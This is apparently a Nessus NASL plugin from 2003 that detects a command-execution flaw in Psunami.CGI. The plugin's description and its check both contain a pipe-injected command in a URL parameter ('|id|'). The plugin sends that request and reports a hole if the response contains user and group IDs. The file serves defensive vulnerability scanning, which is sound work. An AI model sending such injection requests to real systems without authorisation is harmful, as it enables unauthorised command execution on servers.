#
# (C) Tenable Network Security

if(description)
{
 script_id(11750);
 script_version ("$Revision: 1.1 $");
 script_bugtraq_id(6607);
 
 name["english"] = "Psunami.CGI Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is hosting Psunami.CGI

There is a flaw in this CGI which allows an attacker to execute
arbitrary commands with the privileges of the HTTP daemon (typically
root or nobody), by making a request like :
	
	/psunami.cgi?action=board&board=1&topic=|id|

Solution : Upgrade to the newest version of this CGI
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for Psunami.CGI";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port) port = 80;

if(!get_port_state(port))exit(0);


dirs = make_list("","/shop", cgi_dirs());

foreach d (dirs)
{
 req = http_get(item:d+"/psunami.cgi?file=|id|", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if("uid=" >< res && "gid=" >< res)
 {
	security_hole(port);
	exit(0);
 }
}
